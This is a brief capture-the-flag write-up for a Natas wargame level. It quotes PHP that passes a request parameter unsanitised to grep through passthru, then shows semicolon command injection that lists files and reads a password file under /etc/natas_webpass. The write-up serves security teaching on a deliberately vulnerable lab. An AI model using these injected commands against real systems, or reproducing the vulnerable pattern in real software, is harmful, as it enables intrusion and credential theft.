Similar setup to natas8, let's check the source code:
```php
<?

$key = "";     

if(array_key_exists("needle", $_REQUEST)) {
	$key = $_REQUEST["needle"];   
}      

if($key != "") {    
	passthru("grep -i $key dictionary.txt");   
}

?>
```

So it looks like the `$key` variable will hold the input and it will get ran through a `grep` command.

So this way of executing command is pretty insecure. We can inject our own commands into this by entering the command we want to execute as an input and surrounding our command with semicolon to separate our command with the commands the server runs.

Let's test it out with `; ls ;`:
```html
Output:

dictionary.txt
index-source.html
index.php
```

Great, the injection is working. We know that the passwords are stored in `/etc/natas_webpass` from a previous level, so let's try reading the files in there with `; cat /etc/natas_webpass/natas10 ;`:
```html
Output:

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```